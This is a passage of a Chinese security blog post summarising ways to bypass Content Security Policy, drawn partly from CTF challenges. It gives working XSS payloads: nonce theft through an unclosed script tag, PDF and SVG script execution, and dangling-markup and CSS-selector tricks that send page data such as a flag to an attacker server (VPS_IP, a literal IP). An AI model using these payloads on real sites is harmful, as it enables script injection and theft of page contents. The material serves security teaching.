+<p>如果我们输入 <code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code> 即可xss<br>这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的&lt;script会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77196efa-738e-1.png" alt="图片.png"></p>
+<p>但是在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png" alt="图片.png"><br>这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 3.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">a</span>=<span class="string">"123"</span> <span class="attr">b</span>=<span class="string">"456"</span> <span class="attr">a</span>=<span class="string">"789"</span> <span class="attr">a</span>=<span class="string">"abc"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772ac830-738e-1.png" alt="图片.png"></p>
+<p>于是我们可以输入 <code>http://127.0.0.1/2.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code><br>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样exp就能成功在chrome浏览器上执行<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7734112e-738e-1.png" alt="图片.png"><br>利用条件:</p>
+<ol>
+<li>可控点在合法script标签上方,且其中没有其他标签</li>
+<li>XSS页面的CSP script-src只采用了nonce方式</li>
+</ol>
+<h3 id="object-src绕过（PDFXSS）"><a href="#object-src绕过（PDFXSS）" class="headerlink" title="object-src绕过（PDFXSS）"></a>object-src绕过（PDFXSS）</h3><p>假如只有这一个页面，我们能有办法执行JS吗</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>在CSP标准里面，有一个属性是object-src，它限制的是 <object> <applet>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束<br>最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例<br>PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本</applet></object></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"//vps_ip/123.pdf"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77407888-738e-1.png" alt="图片.png"><br>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br>里面有上面实例用的恶意pdf文件</p>
+<p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件</p>
+<p>利用条件:</p>
+<ol>
+<li>没有设置object-src，或者object-src没有设置为’none’</li>
+<li>pdf用的是chrome的默认解析器</li>
+</ol>
+<h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p>
+<p>之前的easer CONFidence CTF就出过svg的xss<br>引用 <a href="https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/" target="_blank" rel="noopener">https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/</a><br>1.svg</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-774957c8-738e-1.png" alt="图片.png"><br>利用条件:</p>
+<ol>
+<li>可以上传svg图片</li>
+</ol>
+<h3 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h3><p>看看下面的例子，我们如何把flag给带出来</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; img-src *;"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"id"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的&lt;img标签来将数据带出</p>
+<p>exp: <code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//VPS_IP?a=</code><br>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7753e788-738e-1.png" alt="图片.png"><br>需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;，否者不会发出<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-775a262a-738e-1.png" alt="图片.png"><br>利用条件:</p>
+<ol>
+<li>可以加载外域资源 (img-src: *)</li>
+<li>需要获取页面某处的信息</li>
+<li>不好总结，看上面例子，懂意思就行</li>
+</ol>
+<h3 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h3><p>这个来自2018 SECCON CTF的一道题，虽然原题中不是用来绕csp，但是也能拿过来利用，当然利用条件比较苛刻，需要<br>设置style-src为*，或者只设置了script-src<br>原题可以看看这篇文章<a href="https://www.yourhome.ren/index.php/sec/608.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/608.html</a><br>大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//这里引用的是上面文章中的exp</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="6703"]</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"http://vps_ip/?6703"</span>);&#125;</span><br></pre></td></tr></table></figure>
+<p>这句话的意思是，当input的value值已6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位。。。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; style-src 'unsafe-inline';img-src *"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"flag&#123;0xffff&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>exp: <code>http://127.0.0.1/1.php?xss=&lt;style&gt;input[value^=&quot;flag{0xffff}&quot;] {background-image:url(&quot;http://47.106.65.216:1002/?flag{0xffff}&quot;)}%3C/style%3E</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7765f3ec-738e-1.png" alt="图片.png"><br>太苛刻了，之前想到随便提一下好了<br>利用条件:(好苛刻啊都不想写了)</p>
+<ol>
+<li>style允许内敛，img可以跨域</li>
+<li>需要获取的数据在页面内</li>
+<li>可以新建标签</li>
+<li>可以多次发送xss且获取的数据不会变（毕竟不可能一次请求就注出来，除非能执行js写脚本一口气注）</li>
+</ol>
+<h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br>原题github <a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
+<p>这个原理比较简单，就不写条件了</p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>个人总结的一些csp绕过思路，并不是很全，若有不足，敬请批评补充</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/318#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/318#toc-3</a><br><a href="https://xz.aliyun.com/t/315/" target="_blank" rel="noopener">https://xz.aliyun.com/t/315/</a><br><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br><a href="https://inside.pixiv.blog/kobo/5137" target="_blank" rel="noopener">https://inside.pixiv.blog/kobo/5137</a><br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br><a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere</a><br><a href="https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/" target="_blank" rel="noopener">https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/</a><br><a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF 2018 rBlog writeup</a><br><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a><br><a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a><br><a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md</a></p>
+<hr>
+<p>————————————————</p>
+<p>原文链接：<a href="https://evoa.me/index.php/archives/53/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/</a></p>
+</excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2019/10/19/CSP绕过思路及总结/">CSP绕过思路及总结</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">yearn</a></p>
+        <p><span>Created:</span>2019-10-19, 14:54:39</p>
+        <p><span>Updated:</span>2019-10-20, 14:57:13</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2019/10/19/CSP绕过思路及总结/" title="CSP绕过思路及总结">https://yearn.online/2019/10/19/CSP绕过思路及总结/</a>
+            <span class="copy-path" data-clipboard-text="From https://yearn.online/2019/10/19/CSP绕过思路及总结/　　By yearn" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/10/21/文件上传漏洞-解析、验证伪造一/">
+                    文件上传漏洞----解析、验证、伪造 一
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/10/18/CSRF-1/">
+                    CSRF
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP简介"><span class="toc-number">1.</span> <span class="toc-text">CSP简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP的绕过"><span class="toc-number">2.</span> <span class="toc-text">CSP的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#location-href"><span class="toc-number">2.1.</span> <span class="toc-text">location.href</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#link标签导致的绕过"><span class="toc-number">2.2.</span> <span class="toc-text">link标签导致的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用Iframe绕过"><span class="toc-number">2.3.</span> <span class="toc-text">使用Iframe绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用CDN来绕过"><span class="toc-number">2.4.</span> <span class="toc-text">用CDN来绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#站点可控静态资源绕过"><span class="toc-number">2.5.</span> <span class="toc-text">站点可控静态资源绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#站点可控JSONP绕过"><span class="toc-number">2.6.</span> <span class="toc-text">站点可控JSONP绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base-uri绕过"><span class="toc-number">2.7.</span> <span class="toc-text">Base-uri绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#不完整script标签绕过nonce"><span class="toc-number">2.8.</span> <span class="toc-text">不完整script标签绕过nonce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#object-src绕过（PDFXSS）"><span class="toc-number">2.9.</span> <span class="toc-text">object-src绕过（PDFXSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SVG绕过"><span class="toc-number">2.10.</span> <span class="toc-text">SVG绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#不完整的资源标签获取资源"><span class="toc-number">2.11.</span> <span class="toc-text">不完整的资源标签获取资源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS选择器获取内容"><span class="toc-number">2.12.</span> <span class="toc-text">CSS选择器获取内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF绕过"><span class="toc-number">2.13.</span> <span class="toc-text">CRLF绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后话"><span class="toc-number">3.</span> <span class="toc-text">后话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"CSP绕过思路及总结　| 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/10/19/CSP绕过思路及总结/" data-title="CSP绕过思路及总结" data-url="https://yearn.online/2019/10/19/CSP绕过思路及总结/"></div>
+    <script>
+        var duoshuoQuery = {short_name:""};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/10/21/文件上传漏洞-解析、验证伪造一/" title="Pre: 文件上传漏洞----解析、验证、伪造 一">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/10/18/CSRF-1/" title="Next: CSRF">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/PHP远程代码执行漏洞预警（CVE-2019-11043）/">PHP远程代码执行漏洞预警（CVE-2019-11043）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/变量覆盖漏洞-1/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/XXE-实体注入 -1/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/29/XXE漏洞(CVE-2019-2888)分析/">WebLogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/SSRF-服务器端请求伪造-1/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/26/探究if条件语句引发的两个Web漏洞/">探究if条件语句引发的两个Web漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/文件上传漏洞-解析、验证伪造三/">文件上传漏洞----解析、验证伪造 三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/文件上传漏洞-解析、验证伪造二/">文件上传漏洞----解析、验证伪造 二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/WordPress =5.2.3/">WordPress <=5.2.3：如何查看未授权文章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/文件上传漏洞-解析、验证伪造一/">文件上传漏洞----解析、验证、伪造 一</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/19/CSP绕过思路及总结/">CSP绕过思路及总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/18/CSRF-1/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/PCRE绕过/">PCRE绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/16/Dom-Based-XSS-1/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/15/储存型XSS-1/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/反序列化导致任意代码执行/">Typecho install.php 反序列化导致任意代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/XSS的原理分析与解剖-1/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Linux提权/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Oracle注入-—-报错注入/">Oracle注入 — 报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/08/MSSQL注入-—-反弹注入/">MSSQL注入 — 反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/06/MySQL注入-—-Dns-注入/">MySQL注入 — Dns 注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/通过Shodan发现目标应用Marathon服务的RCE漏洞/">通过Shodan发现目标应用Marathon服务的RCE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/DNS隧道流量分析/">DNS隧道流量分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Acccess偏移注入-1/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/WordPress插件中的XSS漏洞的复现分析与利用/">WordPress插件中的XSS漏洞的复现分析与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/宽字节注入-1/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/25/盲注-1/">盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/MS08-067如何利用/">MS08_067如何利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/POST注入-HEAD注入/">POST注入/HEAD注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/22/SQL注入的原理分析/">SQL注入的原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/21/正则表达式/">正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/20/后端基础SQL—高级查询与子查询/">后端基础SQL—高级查询与子查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/无需登录绕过waf可union-select跨表查询/">无需登录绕过waf可union-select跨表查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/waf/">waf</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/01/Sql注入 - 0day审计案例/">Sql注入 - 0day审计案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/28/支付漏洞/">支付漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/平行越权、垂直越权/">平行越权、垂直越权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/unserialize反序列化漏洞/">unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/本地包含与远程包含/">本地包含与远程包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/变量覆盖漏洞/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/21/SSRF-服务器端请求伪造/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/XXE-实体注入/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/文件上传漏洞-解析、验证伪造（三）/">文件上传漏洞----解析、验证伪造（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/18/文件上传漏洞-解析、验证伪造（二）/">文件上传漏洞----解析、验证伪造（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/09/文件上传漏洞-解析、验证伪造（一）/">文件上传漏洞----解析、验证、伪造（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/08/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/Dom-Based-XSS/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/储存型XSS/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/XSS的原理分析与解剖/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/Oracle报错注入/">Oracle注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/MSQL反弹注入0-0/">MSQL反弹注入0.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/Acccess偏移注入/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/MYSQL-Dns注入/">MYSQL-Dns注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/盲注/">MYSQL注入天书之盲注讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/POST注入原理分分析/">POST注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/sql注入原理分析/">sql注入原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/正则小试牛刀/">正则小试牛刀</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/测试哦！/">测试哦！</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 yearn
+            </div>
+            <div class="footer-right">
